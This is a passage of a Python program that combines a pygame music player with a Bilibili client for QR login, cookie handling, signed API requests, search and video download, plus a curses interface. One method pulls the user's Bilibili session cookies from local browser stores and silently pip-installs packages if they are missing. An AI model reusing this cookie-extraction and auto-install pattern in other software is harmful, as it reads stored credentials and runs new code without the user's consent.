                elif b_play.hit(mx, my):
                    a.toggle()
                elif b_stop.hit(mx, my):
                    a.stop()
                elif b_next.hit(mx, my):
                    a.nxt()
                elif b_srch.hit(mx, my):
                    panel.open = True; panel.msg = ""; info("按钮: 搜索")
                elif b_reload.hit(mx, my):
                    cnt = a.scan(MUSIC_DIR if MUSIC_DIR.is_dir() else Path("."))
                    info(f"刷新列表: {cnt} 首")
                    scroll = 0
                elif b_del.hit(mx, my):
                    if 0 <= a.idx < len(a.list):
                        deleting["active"] = True
                        deleting["idx"] = a.idx
                        info(f"请求删除: {os.path.basename(a.list[a.idx])}")
                    else:
                        warn("没有选中的歌曲")
                if BAR_X - 10 <= mx <= BAR_X + BAR_W + 10 and BAR_Y - 8 <= my <= BAR_Y + BAR_H + 8:
                    drag_p = True
                    a.seek(max(0.0, min(1.0, (mx - BAR_X) / BAR_W)) * a.dur)
                    info(f"进度跳转: {a.real_now():.1f}s")
                if VOL_X - 10 <= mx <= VOL_X + VOL_W + 10 and VOL_Y - 8 <= my <= VOL_Y + 14:
                    drag_v = True
                    a.set_vol(max(0.0, min(1.0, (mx - VOL_X) / VOL_W)))
                if LIST_X <= mx <= LIST_X + LIST_W - 12 and LIST_Y <= my <= LIST_Y + LIST_H:
                    row = (my - LIST_Y - 6) // 26 + scroll
                    if 0 <= row < len(a.list):
                        a.load(row)
                        info(f"点击列表: {row+1}")

            elif event.type == pygame.MOUSEBUTTONUP:
                drag_p = drag_v = False
                drag_list_scroll = False

            elif event.type == pygame.MOUSEMOTION and not panel.open:
                mx, my = event.pos
                if drag_list_scroll:
                    sb = list_scrollbar_rect(a, scroll)
                    if sb:
                        sx, sy, sw, sh, vis2, total = sb
                        thumb_h = max(20, int(sh * vis2 / total))
                        travel = sh - thumb_h
                        if travel > 0:
                            rel = max(0.0, min(1.0, (my - sy - thumb_h / 2) / travel))
                            scroll = int(rel * max(0, total - vis2))
                    continue
                if drag_p:
                    a.seek(max(0.0, min(1.0, (mx - BAR_X) / BAR_W)) * a.dur)
                if drag_v:
                    a.set_vol(max(0.0, min(1.0, (mx - VOL_X) / VOL_W)))
                for b in buttons:
                    b.hover_check(mx, my)

            elif event.type == pygame.MOUSEWHEEL and not panel.open:
                scroll_max = max(0, len(a.list) - 12)
                scroll = max(0, min(scroll_max, scroll - event.y))

        a.ended()

        if downloading["active"]:
            name = downloading["name"]
            it_id = None
            if panel.results:
                for it in panel.results:
                    if f"{it['name']} - {it['artist']}" == name:
                        it_id = it["id"]
                        break
            fill_bg(screen)
            screen.blit(F_TITLE.render(WINDOW_TITLE, True, C_ACCENT), (60, 20))
            draw_modal(screen, "下载中", [f"正在下载: {name}", "请稍候..."], [])
            pygame.display.flip()
            if it_id is not None:
                ok = download_song(it_id, name)
                if ok:
                    cnt = a.scan(MUSIC_DIR if MUSIC_DIR.is_dir() else Path("."))
                    info(f"下载后刷新列表: {cnt} 首")
                else:
                    warn("下载失败")
            downloading["active"] = False
            continue

        if a.paused:
            b_play.text = "继续"
        elif a.playing:
            b_play.text = "暂停"
        else:
            b_play.text = "播放"

        fill_bg(screen)
        screen.blit(F_TITLE.render(WINDOW_TITLE, True, C_ACCENT), (60, 20))

        if a.idx >= 0 and a.list:
            name = os.path.basename(a.list[a.idx])
            if len(name) > 46:
                name = name[:44] + ".."
            info_s = F_NORM.render(f"正在播放: {name}", True, C_TEXT)
        else:
            info_s = F_NORM.render("未在播放", True, C_DIM)
        screen.blit(info_s, (60, 420))

        draw_bar(screen, a)
        draw_list(screen, a, scroll)
        draw_lyric(screen, a)
        draw_vol(screen, a)
        for b in buttons:
            b.draw(screen)

        hint = F_SMALL.render(
            "空格:播放/暂停  S:停止  ←→:快退/快进  N/P:上下首  ↑↓:音量  F:搜索",
            True, C_DIM
        )
        screen.blit(hint, (60, 610))

        if panel.open:
            panel.draw(screen, dt)

        if deleting["active"]:
            idx = deleting["idx"]
            fname = os.path.basename(a.list[idx]) if 0 <= idx < len(a.list) else "?"
            draw_modal(
                screen, "确认删除",
                [f"文件: {fname}", "同时删除同名 .lrc 歌词文件"],
                [("删除", C_DANGER), ("取消", C_BTN)],
                deleting["hover"]
            )

        pygame.display.flip()

    info("退出，释放资源")
    pygame.quit()
    info("程序结束")
    GUI_MODE = False
    sys.exit(0)
# ===========================  B站工具 ============================
class fetch_bili():
  MIXIN_KEY_ENC_TAB = [
        46, 47, 18, 2, 53, 8, 23, 32, 15, 50, 10, 31, 58, 3, 45, 35,
        27, 43, 5, 49, 33, 9, 42, 19, 29, 28, 14, 39, 12, 38, 41, 13,
        37, 48, 7, 16, 24, 55, 40, 61, 26, 17, 0, 1, 60, 51, 30, 4,
        22, 25, 54, 21, 56, 59, 6, 63, 57, 62, 11, 36, 20, 34, 44, 52,
    ]
  def __init__(self):
     self.API_TIMEOUT = API_TIMEOUT
     self.HTTP_PROXY = HTTP_PROXY
     self.term_w, self.term_h = self.get_terminal_size()
     self.cookies = None
     self.fetch_ps = 20
     self.session = requests.Session()
     self.__percent__=0
     self.session.headers.update({
         "User-Agent": (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/126.0.0.0 Safari/537.36"
         ),
         "Referer": "https://www.bilibili.com",
         "Origin": "https://www.bilibili.com",
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
         "Connection": "keep-alive",
     })
     self._mixin_key = None
     self._mixin_key_expiry = 0
     try: self.session.get("https://www.bilibili.com/", timeout=10)
     except Exception: pass
     self.search_order=["totalrank","click","pubdate","dm","stow"]
     self.search_type=["video","user","bangumi","pgc","live","article"]
     self.search_do_type=["bili_user","video","media_bangumi","media_ft","live","live_room","article","topic","user","photo"]
     self.api_nav="https://api.bilibili.com/x/web-interface/nav"
     self.api_recommend = "https://api.bilibili.com/x/web-interface/index/top/feed/rcmd"
     self.api_pop = "https://api.bilibili.com/x/web-interface/popular"
     self.api_search = "https://api.bilibili.com/x/web-interface/search/all/v2"
     self.api_up_search = "https://api.bilibili.com/x/web-interface/search/type"
     self.api_do_search = "https://api.bilibili.com/x/web-interface/wbi/search/type"
     self.api_history = "https://api.bilibili.com/x/v2/history"
     self.api_toview = "https://api.bilibili.com/x/v2/history/toview"
     self.api_login_generate = "https://passport.bilibili.com/x/passport-login/web/qrcode/generate"
     self.api_login_poll = "https://passport.bilibili.com/x/passport-login/web/qrcode/poll"
     self.api_view = "https://api.bilibili.com/x/web-interface/view"
     self.api_playurl = "https://api.bilibili.com/x/player/playurl"
  
  def parse_bvid(self, url):
   m = re.search(r'(BV[0-9A-Za-z]{10})', url)
   if m: return m.group(1)
   m = re.search(r'av(\d+)', url)
   if m: return self.av2bv(int(m.group(1)))
   return None
   
  def av2bv(self, aid):
   XOR_CODE=23442827791579;MASK_CODE=2251799813685247;MAX_AID=1<<51;BASE=58
   ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
   assert aid<MAX_AID,"aid too big"
   bv = ["B","V","1"];tmp = (MAX_AID|aid)^XOR_CODE;arr = [""]*9
   for i in range(8, -1, -1):
    arr[i] = ALPHABET[tmp % BASE]
    tmp //= BASE
   bv.extend(arr)
   return "".join(bv)
   
  def download_link(self, target, save_path=".", page=1, mode="both", qn=None):
   bvid = self.parse_bvid(target)
   if not bvid:
    print(f"无法识别: {target}")
    return False
   return self.download_video(bvid,save_path=save_path,page=page,mode=mode,qn=qn,)
  
  def download_video(self, bvid, save_path=".", page=1, mode="both", qn=None):
    info=self.bili_curl(self.api_view,params={"bvid": bvid},return_type="json").json()
    if info.get("code") != 0:
        print(f"获取视频信息失败: {info.get('message')}")
        return False
    data = info["data"];title = data["title"];pages = data["pages"]
    if page == 0:
        targets = pages
    else:
        if page<1 or page>len(pages):
            print(f"分 P 超出范围: 1~{len(pages)}")
            return False
        targets=[pages[page-1]]
    print(f"视频: {title}")
    print(f"共 {len(pages)} P，将下载 {len(targets)} P")
    if qn: print(f"画质: qn={qn}")
    else: print(f"画质: 自动选最高")
    for i, p in enumerate(targets, 1):
        cid=p["cid"]
        part_title=p["part"]
        duration=p["duration"]
        print(f"\n[{i}/{len(targets)}] {part_title} ({duration}s)")
        params = {"bvid": bvid,"cid": cid,"fnval": 16}
        if qn is not None: params["qn"] = qn
        play=self.bili_curl(self.api_playurl,params=params,return_type="json").json()
        dash=play.get("data", {}).get("dash", {})
        if not dash:
            print("未获取到 DASH 流，跳过")
            continue
        video_streams = dash.get("video", [])
        audio_streams = dash.get("audio", [])
        video_url = None
        audio_url = None
        if video_streams and mode in ("both", "video"):
            if qn is not None:
                matched = [v for v in video_streams if v.get("id") == qn]
                if matched:
                    video_url = max(matched, key=lambda x: x.get("bandwidth", 0))["baseUrl"]
                else:
                    print(f"  没有 qn={qn} 的画质，回退到最高")
                    video_url = max(video_streams, key=lambda x: x.get("bandwidth", 0))["baseUrl"]
            else:
                video_url = max(video_streams, key=lambda x: x.get("bandwidth", 0))["baseUrl"]

        if audio_streams and mode in ("both", "audio"):
            audio_url = max(audio_streams, key=lambda x: x.get("bandwidth", 0))["baseUrl"]
            
        headers = {"Referer": "https://www.bilibili.com","User-Agent": self.session.headers["User-Agent"]}
        safe_title = self._safe_filename(part_title) if len(targets) > 1 else self._safe_filename(title)
        prefix = f"P{page + i - 1} - " if len(targets) > 1 else ""
        video_tmp = os.path.join(save_path, f"{bvid}.{cid}.video.m4s")
        audio_tmp = os.path.join(save_path, f"{bvid}.{cid}.audio.m4s")
        if video_url: self._download_stream(video_url, video_tmp, headers, "视频")
        if audio_url: self._download_stream(audio_url, audio_tmp, headers, "音频")
        if mode == "both" and video_url and audio_url:
         output = os.path.join(save_path, f"{prefix}{safe_title}.mp4")
         try:
          subprocess.run(["ffmpeg", "-y","-i", video_tmp,"-i", audio_tmp,"-c:v", "copy","-c:a", "copy",output], check=True, capture_output=True)
          print(f"  合并完成: {output}")
         except subprocess.CalledProcessError: print(f"  合并失败，请确认已安装 ffmpeg")
         finally:
          for f in [video_tmp, audio_tmp]:
           if os.path.exists(f): os.remove(f)
        elif mode == "video" and video_url:
            output = os.path.join(save_path, f"{prefix}{safe_title}.mp4")
            os.rename(video_tmp, output)
            print(f"  视频已保存: {output}")
        elif mode == "audio" and audio_url:
            output = os.path.join(save_path, f"{prefix}{safe_title}.m4a")
            os.rename(audio_tmp, output)
            print(f"  音频已保存: {output}")
        else:
         for f in [video_tmp, audio_tmp]:
          if os.path.exists(f): os.remove(f)
    print(f"\n全部完成")
    return True
    
  def _download_stream(self, url, path, headers, label):
    resp = self.session.get(url, headers=headers, stream=True, timeout=30)
    total = int(resp.headers.get("content-length", 0))
    current = 0
    with open(path, "wb") as f:
        for chunk in resp.iter_content(chunk_size=8192):
            f.write(chunk)
            current += len(chunk)
            self.progress_bar(current, total, prefix=f"下载{label}", suffix=os.path.basename(path))
            
  def load_proxy(self, path=None):
    import configparser
    if path is None:
        path = os.path.expanduser("config.conf")
    try:
        cfg = configparser.ConfigParser()
        cfg.read(path, encoding="utf-8")
        proxy = cfg.get("network", "proxy", fallback="").strip()
        if proxy:
            self.HTTP_PROXY = proxy
            return proxy
    except Exception:
        pass
    proxy = os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY")
    self.HTTP_PROXY = proxy
    return proxy
  
  def _get_mixin_key(self):
    now = time.time()
    if self._mixin_key and now < self._mixin_key_expiry:
        return self._mixin_key
    nav = self.session.get(
        self.api_nav,
        timeout=(self.API_TIMEOUT, self.API_TIMEOUT * 2),
    ).json()
    img_url = nav["data"]["wbi_img"]["img_url"]
    sub_url = nav["data"]["wbi_img"]["sub_url"]
    img_key = img_url.rsplit("/", 1)[1].split(".")[0]
    sub_key = sub_url.rsplit("/", 1)[1].split(".")[0]
    raw = img_key + sub_key
    mixin_key = "".join(raw[i] for i in self.MIXIN_KEY_ENC_TAB)[:32]
    self._mixin_key = mixin_key
    self._mixin_key_expiry = now + 3600
    return mixin_key
    
  def check_login(self):
    res = self.bili_curl(self.api_nav, return_type="json").json()
    if res.get("code") != 0:
        return False
    return res.get("data", {}).get("isLogin", False)
    
  def print_qr(self,data,print_ascii=True,save_img=False,save_path=None):
    qr=qrcode.QRCode()
    qr.add_data(data)
    qr.make(fit=True)
    if save_img:
      img = qr.make_image(fill_color="black", back_color="white")
      img.save(f"{save_path}/qr.png")
      return True
    if print_ascii: qr.print_ascii(invert=True)
    else:
     matrix = qr.get_matrix()
     for row in matrix:
      line = ""
      for cell in row:
       if cell: line += "\033[40m  \033[0m"
       else: line += "\033[47m  \033[0m"
      print(line)
      
  def _sign(self, params):
    mixin_key = self._get_mixin_key()
    params = dict(params)
    params["wts"] = int(time.time())
    sorted_keys = sorted(params.keys())
    sign_str = "&".join(
        f"{k}={urllib.parse.quote(str(params[k]), safe='')}"
        for k in sorted_keys
    )
    w_rid = hashlib.md5((sign_str + mixin_key).encode()).hexdigest()
    params["w_rid"] = w_rid
    return params
    
  def load_cookies(self, path="cookies.txt"):
    try:
        jar = http.cookiejar.MozillaCookieJar(path)
        jar.load(ignore_discard=True, ignore_expires=True)
        self.cookies = jar
        self.session.cookies.update(jar)
        return True
    except Exception:
        self.cookies = None
        return False
        
  def save_cookies(self, path="cookies.txt"):
    if not self.cookies:
        return False
    try:
        jar = self.cookies
        if isinstance(jar, dict):
            import http.cookiejar
            new_jar = http.cookiejar.MozillaCookieJar()
            for name, value in jar.items():
                cookie = http.cookiejar.Cookie(
                    version=0, name=name, value=value,
                    port=None, port_specified=False,
                    domain=".bilibili.com", domain_specified=True,
                    domain_initial_dot=True,
                    path="/", path_specified=True,
                    secure=False, expires=None,
                    discard=False, comment=None,
                    comment_url=None, rest={},
                )
                new_jar.set_cookie(cookie)
            jar = new_jar
        jar.save(path, ignore_discard=True, ignore_expires=True)
        os.chmod(path, 0o600)
        return True
    except Exception:
        return False
    
  def login_by_qr(self,path="cookies.txt",print_ascii=True,save_img=False,save_path=None):
    resp = self.bili_curl(self.api_login_generate,return_type="json",headers={"Referer": "https://passport.bilibili.com/login"}).json()
    if resp.get("code") != 0:
        print(f"申请二维码失败: {resp}")
        return False
    qr_url = unquote(resp["data"]["url"])
    qrcode_key = resp["data"]["qrcode_key"]
    print(self.print_qr(qr_url,print_ascii=print_ascii,save_img=save_img,save_path=save_path))
    if save_img:
      img_path=os.path.abspath(f"{save_path}/qr.png")
      if os.name == "posix" and "com.termux" in os.environ.get("PREFIX",""): subprocess.run(["termux-open", img_path])
      elif os.name == "nt": os.startfile(img_path)
      else: subprocess.run(["xdg-open", img_path])
    print("请用 B站 App 扫码登录...")
    start_time = time.time()
    total_wait = 180
    last_poll = 0
    while True:
        elapsed=time.time()-start_time;remain=max(0,total_wait-elapsed)
        self.progress_bar(int(elapsed),total_wait,prefix="等待扫码",suffix=f"剩余 {int(remain)}s",length=30)
        if remain <= 0:
            print("\n二维码已过期，请重新运行")
            return False
        if time.time()-last_poll> 2:
            last_poll = time.time()
            resp = self.bili_curl(self.api_login_poll,params={"qrcode_key": qrcode_key},return_type="json").json();code=resp.get("data", {}).get("code")
            if code == 0:
                print("\r" + " " * 80 + "\r", end="")
                cookies = self.session.cookies.get_dict()
                self.save_cookies(path=path)
                sessdata = cookies.get("SESSDATA")
                bili_jct = cookies.get("bili_jct")
                buvid3 = cookies.get("buvid3")
                if sessdata:
                    self.cookies = cookies
                    print("登录成功！")
                    return True
                else:
                    print("登录成功但没拿到 SESSDATA")
                    return False
            elif code == 86090:
                print("\r" + " " * 80 + "\r", end="")
                print("已扫码，请在手机上确认...", end="", flush=True)
            elif code == 86038:
                print("\n二维码已过期，请重新运行")
                return False
            elif code != 86101:
                print(f"\n未知状态: {code}")
                return False
        time.sleep(0.5)
        
  def get_terminal_size(self):
    size = shutil.get_terminal_size(fallback=(80, 24))
    width = size.columns or int(os.environ.get("COLUMNS", 80))
    height = size.lines or int(os.environ.get("LINES", 24))
    return width, height
  def clear_line(self): print("\r" + " " * self.term_w + "\r", end="", flush=True)
  def progress_bar(self, current, total, prefix="", suffix="", length=None, fill="█", empty="░"):
    self.term_w, self.term_h = self.get_terminal_size()
    overhead = len(prefix) + 12
    max_suffix = max(0, self.term_w - overhead - 20)
    if len(suffix) > max_suffix:
     if max_suffix > 6: head = (max_suffix - 3) // 2 ; tail = max_suffix - 3 - head ; suffix = suffix[:head] + "..." + suffix[-tail:]
     else: suffix = suffix[:max_suffix]
    if length is None: length = max(10, self.term_w - len(prefix) - len(suffix) - 20)
    if total <= 0: percent = 0
    else: percent = min(1.0, current / total)
    if percent != self.__percent__:
     filled = int(length * percent)
     bar = fill * filled + empty * (length - filled)
     line = f"\r{prefix} |{bar}| {percent*100:.1f}% {suffix}\033[20X"
     if len(line) > self.term_w: line = line[:self.term_w - 1]
     print(line, end="", flush=True)
     if current >= total: print()
     self.__percent__=percent
     
  def load_cookies_in_browser(self,idx=None):
     try: import browser_cookie3
     except ModuleNotFoundError: 
       subprocess.run([sys.executable,"-m","pip","install","browser_cookie3","pycryptodome","keyring"],check=True)
       import browser_cookie3
     browsers=["chrome","chromium","firefox","librewolf","opera","opera_gx","edge","brave","vivaldi","arc","safari","w3m","lynx"]
     try: browsers[idx]
     except: return browsers
     try:
        self.cookies=getattr(browser_cookie3,browsers[1])(domain_name=".bilibili.com")
        return True
     except Exception:
        self.cookies = None
        return False
     
  def bili_curl(self,url,params=None,return_type=None,request_type="GET",wbi=False,headers=None):
     head = dict(self.session.headers)
     if headers:
        head.update(headers)
     if params is None:
        params = {}
     if wbi:
        params = self._sign(params)
     proxies={
       "http": self.HTTP_PROXY,
       "https": self.HTTP_PROXY,
     }
     try: resource = requests.request(request_type,url,headers=self.session.headers,cookies=self.cookies,timeout=(self.API_TIMEOUT,self.API_TIMEOUT*2),proxies=proxies,params=params)
     except Exception as err: 
       data = {"code": -1, "message": f"请求错误: {err}", "data": None}
       return type("R", (), {"json": lambda self: data})()
     if return_type == "json":
      try: data = resource.json()
      except Exception as err:
         data = {"code": -1, "message": f"返回数据不是json: {err}", "data": resource.text}
         return type("R", (), {"json": lambda self: data})()
     return resource
     
  def _safe_filename(self, name): return re.sub(r'[\\/:*?"<>|]', "_", name)
  def get_history(self,pn=1,wbi=False): return self.bili_curl(self.api_history,params={"ps": self.fetch_ps,"pn": pn},wbi=wbi,return_type="json").json()
  def get_toview(self,pn=1,wbi=False): return self.bili_curl(self.api_toview,params={"ps": self.fetch_ps,"pn": pn},wbi=wbi,return_type="json").json()
  def get_recommend(self,pn=1,wbi=False): return self.bili_curl(self.api_recommend,params={"ps": self.fetch_ps,"pn": pn},wbi=wbi,return_type="json").json()
  def get_pop(self,pn=1,wbi=False): return self.bili_curl(self.api_pop,params={"ps": self.fetch_ps,"pn": pn},wbi=wbi,return_type="json").json()
  def search(self,search,pn=1,idx=0,wbi=False): return self.bili_curl(self.api_search,headers={"Referer": "https://search.bilibili.com"},params={"order": self.search_order[idx],"keyword": search,"page_size": self.fetch_ps,"page": pn},wbi=wbi,return_type="json").json()
  def up_search(self,search,pn=1,idx=0,wbi=False): return self.bili_curl(self.api_up_search,headers={"Referer": "https://search.bilibili.com"},params={"search_type": self.search_type[idx],"keyword": search,"page_size": self.fetch_ps,"page": pn},wbi=wbi,return_type="json").json()
  def do_search(self,search,pn=1,idx=0,wbi=False): return self.bili_curl(self.api_do_search,headers={"Referer": "https://search.bilibili.com"},params={"search_type": self.search_do_type[idx],"keyword": search,"page_size": self.fetch_ps,"page": pn},wbi=wbi,return_type="json").json()


import curses, re, html, os, json, time, subprocess, sys, hashlib
from datetime import datetime
from pathlib import Path

TYPES = ["用户", "视频", "番剧", "影视", "直播", "直播间", "专栏", "话题", "UP主", "相册"]
TYPE_VALUES = ["bili_user", "video", "media_bangumi", "media_ft", "live", "live_room", "article", "topic", "user", "photo"]
BROWSERS = ["chrome", "chromium", "firefox", "librewolf", "opera", "opera_gx", "edge", "brave", "vivaldi", "arc", "safari", "w3m", "lynx"]
QUALITY = [("360P", 16), ("480P", 32), ("720P", 64), ("1080P", 80), ("1080P+", 112), ("1080P60", 116), ("4K", 120)]
NEED_LOGIN_QN = {64, 80, 112}
NEED_VIP_QN = {116, 120}


def dw(s):
  return sum(2 if ord(c) > 0x2E80 else 1 for c in s)
def cx(t, w):
  return max(0, (w - dw(t)) // 2)
def tr(t, w):
  o, n = "", 0
  for c in t:
    cw = 2 if ord(c) > 0x2E80 else 1
    if n + cw > w: break
    o += c; n += cw
  return o
def sa(ss, y, x, t, a=0):
  try:
    h, w = ss.getmaxyx()
    if y < 0 or y >= h or x < 0 or x >= w: return
    m = w - x - 1
    if m <= 0: return
    ss.addstr(y, x, tr(t, m), a)
  except curses.error: pass
def box(ss, top, left, h, w, c, title=None):
  if w < 2 or h < 2: return
  a = curses.color_pair(c)
  sa(ss, top, left, "┌" + "─"*(w-2) + "┐", a)
  for i in range(1, h-1): sa(ss, top+i, left, "│", a); sa(ss, top+i, left+w-1, "│", a)
  sa(ss, top+h-1, left, "└" + "─"*(w-2) + "┘", a)
  if title: sa(ss, top, left+2, f" {title} ", a | curses.A_BOLD)


class Dialog:
  def __init__(self, title, items, buttons, kind="list", default=0, checks=None):
    self.title, self.items, self.buttons, self.kind = title, items, buttons, kind
    self.cursor, self.scroll, self.btn_cursor = default, 0, 0
    self.checks = checks or [False] * len(items)
    self.editing, self.edit_buf = False, ""
    self.result, self.running, self.win = None, True, None

  def size(self, ss):
    h, w = ss.getmaxyx()
    self.dh = min(len(self.items) + 4, h - 4)
    self.dw = min(64, w - 4)
    self.top = (h - self.dh) // 2
    self.left = (w - self.dw) // 2

  def draw(self, ss):
    self.size(ss)
    if self.win is None: self.win = curses.newwin(self.dh, self.dw, self.top, self.left)
    self.win.erase()
    self.win.box()
    try: self.win.addstr(0, 2, f" {self.title} ", curses.A_BOLD)
    except curses.error: pass
    visible = self.dh - 4
    if self.cursor < self.scroll: self.scroll = self.cursor
    if self.cursor >= self.scroll + visible: self.scroll = self.cursor - visible + 1
    for i in range(visible):
      idx = self.scroll + i
      if idx >= len(self.items): break
      line = str(self.items[idx])
      if self.kind in ("check", "form") and idx < len(self.checks):
        line = f"[{'*' if self.checks[idx] else ' '}] {line}"
      if self.editing and idx == self.cursor:
        k = line.rsplit(":", 1)[0] if ":" in line else line
        line = f"{k}: {self.edit_buf}_"
      a = curses.A_REVERSE | curses.A_BOLD if idx == self.cursor else curses.A_NORMAL
      line = tr(line, self.dw - 4)
      pad = (self.dw - 4) - dw(line)
      if pad > 0: line += " " * pad
      try: self.win.addstr(1 + i, 2, line, a)
      except curses.error: pass
    if len(self.items) > visible:
      for i in range(self.dh - 2):
        c = curses.color_pair(8) if i < visible else curses.color_pair(11)
        try: self.win.addstr(1 + i, self.dw - 1, "|", c)
        except curses.error: pass
    self.btn_pos = []
    total = sum(dw(f" {b['label']} ") + 2 for b in self.buttons)
    bx = max(1, (self.dw - total) // 2)
    for bi, b in enumerate(self.buttons):
      label = f" {b['label']} "
      a = curses.color_pair(4) | curses.A_BOLD if bi == self.btn_cursor else curses.A_NORMAL
      try: self.win.addstr(self.dh - 2, bx, label, a)
      except curses.error: pass
      self.btn_pos.append((bx, bx + dw(label)))
      bx += dw(label) + 2
    self.win.refresh()

  def _commit_edit(self):
    if ":" in self.items[self.cursor]:
      k = self.items[self.cursor].rsplit(":", 1)[0]
      self.items[self.cursor] = f"{k}: {self.edit_buf}"
    else: self.items[self.cursor] = self.edit_buf
    self.editing = False

  def handle_key(self, ss, key):
    if self.editing:
      if isinstance(key, str):
        if key in ("\n", "\r"): self._commit_edit()
        elif key == "\x1b": self.editing = False
        elif key in ("\x7f", "\b"): self.edit_buf = self.edit_buf[:-1]
        elif ord(key) >= 32: self.edit_buf += key
      elif key == curses.KEY_BACKSPACE: self.edit_buf = self.edit_buf[:-1]
      return
    if key == curses.KEY_UP:
      if self.cursor > 0: self.cursor -= 1
    elif key == curses.KEY_DOWN:
      if self.cursor < len(self.items) - 1: self.cursor += 1
    elif key == curses.KEY_PPAGE: self.cursor = max(0, self.cursor - (self.dh - 4))
    elif key == curses.KEY_NPAGE: self.cursor = min(len(self.items) - 1, self.cursor + (self.dh - 4))
    elif key == curses.KEY_HOME: self.cursor = 0
    elif key == curses.KEY_END: self.cursor = len(self.items) - 1
    elif key == " " and self.kind == "check" and self.cursor < len(self.checks):
      self.checks[self.cursor] = not self.checks[self.cursor]
    elif key in ("\n", "\r") and self.kind == "form":
      if ":" in self.items[self.cursor]:
        self.edit_buf = self.items[self.cursor].rsplit(":", 1)[1].strip()
        self.editing = True
      else:
        b = self.buttons[self.btn_cursor]
        self.result = {"action": b["action"], "cursor": self.cursor, "checks": list(self.checks)}
        self.running = False
    elif key == "\t": self.btn_cursor = (self.btn_cursor + 1) % len(self.buttons)
    elif key == curses.KEY_LEFT: self.btn_cursor = (self.btn_cursor - 1) % len(self.buttons)
    elif key == curses.KEY_RIGHT: self.btn_cursor = (self.btn_cursor + 1) % len(self.buttons)
    elif key in ("\n", "\r"):
      b = self.buttons[self.btn_cursor]
      self.result = {"action": b["action"], "cursor": self.cursor, "checks": list(self.checks)}
      self.running = False
    elif key == "\x1b":
      self.result = {"action": "cancel"}
      self.running = False

  def handle_mouse(self, ss, mx, my, bs):
    rx, ry = mx - self.left, my - self.top
    if rx < 0 or rx >= self.dw or ry < 0 or ry >= self.dh: return
    if bs & curses.BUTTON4_PRESSED: self.cursor = max(0, self.cursor - 1); return
    if bs & curses.BUTTON5_PRESSED: self.cursor = min(len(self.items) - 1, self.cursor + 1); return
    if ry == self.dh - 2:
      for bi, (b1, b2) in enumerate(self.btn_pos):
        if b1 <= rx < b2:
          self.result = {"action": self.buttons[bi]["action"], "cursor": self.cursor, "checks": list(self.checks)}
          self.running = False
          return
    if 1 <= ry < self.dh - 2:
      idx = self.scroll + (ry - 1)
      if 0 <= idx < len(self.items):
        self.cursor = idx
        if self.kind == "check" and idx < len(self.checks): self.checks[idx] = not self.checks[idx]

  def run(self, ss, draw_bg):
    while self.running:
      draw_bg(ss)
      ss.refresh()
      self.draw(ss)
      try: ss.timeout(200); key = ss.get_wch()
      except curses.error: continue
      except KeyboardInterrupt: break
      if key == curses.KEY_MOUSE:
        try: _, mx, my, _, bs = curses.getmouse()
        except Exception: continue
        self.handle_mouse(ss, mx, my, bs)
      else: self.handle_key(ss, key)
    if self.win:
      self.win.clear(); self.win.refresh(); del self.win; self.win = None
    ss.touchwin(); ss.refresh()
    return self.result


def _md5(s):
  return hashlib.md5(str(s).encode()).hexdigest()


def bili_tui(client, player=None, conf_file=None, music_dir=None):
  def conf_path():
    if conf_file: return conf_file
    try:
      sd = os.path.dirname(os.path.abspath(__file__)); n = os.path.splitext(os.path.basename(__file__))[0]
    except NameError:
      sd = os.getcwd(); n = "config"
    return os.path.join(sd, f"{n}.conf")

  MUSIC_DIR = music_dir or "/storage/emulated/0/Music"

  DEFAULTS = {"COOKIE_PATH": "cookies.txt", "CACHE_DIR": "cache", "HTTP_PROXY": "", "download_mode": "audio", "fetch_ps": "20", "use_term_height": "0", "browser_idx": "-1", "dlg_mode": "audio", "dlg_qn": "80", "dlg_page": "1", "play_qn": "80", "play_page": "1"}

  def load_conf():
    d = dict(DEFAULTS)
    p = conf_path()
    if not os.path.exists(p): return d
    try:
      for line in open(p, encoding="utf-8"):
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line: continue
        k, v = line.split("=", 1)
        if k.strip() in d: d[k.strip()] = v.strip()
    except Exception: pass
    return d

  def save_conf(d):
    try:
      with open(conf_path(), "w", encoding="utf-8") as f:
        for k, v in d.items(): f.write(f"{k}={v}\n")
    except Exception: pass

  conf = load_conf()
  COOKIE_PATH, CACHE_DIR = conf["COOKIE_PATH"], conf["CACHE_DIR"]
  HTTP_PROXY = conf["HTTP_PROXY"] or None
  DOWNLOAD_MODE, FETCH_PS = conf["download_mode"], int(conf["fetch_ps"] or 20)
  USE_TERM_H, BROWSER_IDX = conf["use_term_height"] == "1", int(conf["browser_idx"])
  DLG_MODE, DLG_QN, DLG_PAGE = conf["dlg_mode"], int(conf["dlg_qn"]), int(conf["dlg_page"])
  PLAY_QN, PLAY_PAGE = int(conf["play_qn"]), int(conf["play_page"])

  try: os.makedirs(CACHE_DIR, exist_ok=True)
  except Exception: pass

  def cl(k, age=36000):
    p = os.path.join(CACHE_DIR, re.sub(r'[\\/:*?"<>|]', "_", k) + ".json")
    if not os.path.exists(p): return None
    try:
      o = json.load(open(p, encoding="utf-8"))
      return None if time.time() - o.get("_ts", 0) > age else o.get("data")
    except Exception: return None

  def cs(k, d):
    try:
      p = os.path.join(CACHE_DIR, re.sub(r'[\\/:*?"<>|]', "_", k) + ".json")
      json.dump({"_ts": time.time(), "data": d}, open(p, "w", encoding="utf-8"), ensure_ascii=False)
    except Exception: pass

  S = {"edit": False, "ft": False, "q": "", "ti": 1, "mode": "popular", "items": [], "cur": 0, "off": 0, "pg": 1, "tp": 1, "run": True, "login": "未登录", "load": False, "hit": False, "tpos": [], "bprev": (0,0), "bnext": (0,0), "dbtn": {}, "playing": False, "vol": 0.7, "last_click": 0, "last_idx": -1, "temp_ps": None, "pbar": (0,0), "vbar": (0,0), "pbar_row": -1, "vbar_row": -1, "loading_more": False, "msg": "", "dragging": None, "drag_time": 0}

  def clean(s): return html.unescape(re.sub(r'</?em[^>]*>', '', s or "")).strip()
  def cur_ps():
    if S["temp_ps"] is not None: return S["temp_ps"]
    if USE_TERM_H:
      try: return max(5, curses.LINES - 14)
      except Exception: return FETCH_PS
    return FETCH_PS

  def parse(res, t):
    out = []
    if not res or res.get("code") != 0: return out, 1
    d = res.get("data") or {}
